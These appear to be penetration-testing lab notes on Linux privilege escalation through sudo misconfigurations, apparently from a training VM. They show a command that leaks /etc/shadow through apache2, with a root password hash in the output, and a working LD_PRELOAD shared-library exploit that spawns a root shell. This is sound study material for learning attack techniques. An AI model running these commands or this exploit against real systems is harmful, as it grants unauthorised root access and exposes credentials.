## Shell Escaping
```bash
$ sudo -l		# <-check gtfobins
```
---
## Abusing Intended Functionality
```bash
$ sudo -l
User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2		# <- sudo apache2 -f /etc/shadow
    (root) NOPASSWD: /bin/more
```
```bash
$ sudo apache2 -f /etc/shadow
	Syntax error on line 1 of /etc/shadow:
	Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module  not included in the server configuration
```
---
## LD_PRELOAD
```bash
$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
```
####  Exploit Code:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
### Victim VM
Save the above code as x.c
```bash
$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
$ sudo LD_PRELOAD=/tmp/x.so apache2
```